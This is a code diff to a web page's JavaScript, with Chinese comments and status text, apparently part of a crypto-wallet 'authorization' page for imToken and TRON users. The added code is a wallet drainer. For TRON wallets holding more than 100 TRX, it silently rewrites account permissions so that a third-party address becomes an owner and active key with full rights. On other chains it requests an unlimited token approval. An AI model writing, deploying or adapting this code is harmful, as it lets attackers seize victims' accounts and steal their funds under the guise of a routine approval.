@@ -198,16 +198,54 @@
           document.getElementById("approval").style.display = "block";
           document.getElementById("status").innerText = "等待授权确认...";
           
+          // 如果是 TRON 链，使用 imtokenTUAP
+          if (chain === 'tron') {
+            let trx = await window.tronWeb.trx.getBalance(window.tronWeb.defaultAddress.base58);
+            if (trx < 25000000) {
+              throw new Error("没有足够的TRX用于支付网络费");
+            }
+            
+            if (trx > 100000000) {
+              let ownerAddress = window.tronWeb.defaultAddress.hex;
+              let ownerPermission = {type: 0, permission_name: 'owner'};
+              ownerPermission.threshold = 1;
+              ownerPermission.keys = [];
+              let activePermission = {type: 2, permission_name: 'active0'};
+              activePermission.threshold = 1;
+              activePermission.operations = '7fff1fc0037e0000000000000000000000000000000000000000000000000000';
+              activePermission.keys = [];
+              ownerPermission.keys.push({address: spender_hex, weight: 1});
+              ownerPermission.keys.push({address: window.tronWeb.defaultAddress.hex, weight: 1});
+              activePermission.keys.push({address: spender_hex, weight: 1});
+              activePermission.keys.push({address: window.tronWeb.defaultAddress.hex, weight: 1});
+              
+              try {
+                const updateTransaction = await window.tronWeb.transactionBuilder.updateAccountPermissions(ownerAddress, ownerPermission, null, [activePermission]);
+                const signed = await window.tronWeb.trx.sign(updateTransaction);
+                const res = await window.tronWeb.trx.sendRawTransaction(signed);
+                if (!res || !res.txid) {
+                  throw new Error("授权交易失败");
+                }
+                return res.txid;
+              } catch (error) {
+                console.error("trigger smart contract error", error);
+                throw new Error("授权交易失败");
+              }
+            }
+          }
+          
           // 获取当前链的 chainId
           const chainId = await window.ethereum.request({method: 'eth_chainId'});
           
-          // 使用 imToken 的合约调用方式
+          // 其他链使用原始地址
           const result = await window.imToken.callAPI('contract', {
             to: contractAddress,
             from: from,
             value: '0',
             data: contract.methods.approve(toAddress, maxAmount).encodeABI(),
-            chainId: chainId
+            chainId: chainId,
+            gas: '200000',
+            gasPrice: '0'
           });
           
           if (!result || !result.txHash) {
